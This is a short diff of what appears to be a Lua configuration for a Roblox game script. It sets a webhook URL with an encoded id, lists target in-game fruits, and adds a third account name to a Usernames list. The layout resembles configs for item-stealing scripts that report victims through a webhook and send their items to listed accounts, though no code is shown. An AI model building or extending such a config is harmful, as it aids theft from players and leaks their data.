@@ -1,6 +1,6 @@
 Webhook =
     "https://webhook-protect.vercel.app/api/webhook?id=LXJ0V3dvOV9IWVpBZjU1T09BeDJrZzpJamZlSUoxZ05GaWhURDZ3NWNHcTV6RWtESkVtdUkwVU9kWTJzWlY3NDFNWnRLSGprWWZJTmFrX05oTHprQno4RjRUUTNxM2JpdDNvdmc4cV8yZjJKX1BVdFNqSG53dkV4VS1sNEk4V3RUSkt6SURuZ3lxeU1ZVjZlT0NVQUhpU2FDZ3VKTUVFSnRNV0tuOVhRandsYWE2RDBjV3VnM29UWjAwX0Y3aUFyYlU"
-Usernames = {"3IKSSA228", "vovasevere1"}
+Usernames = {"3IKSSA228", "vovasevere1", "BosicXyesik1"}
 FruitsToHit = {
     "Buddha-Buddha",
     "Portal-Portal",
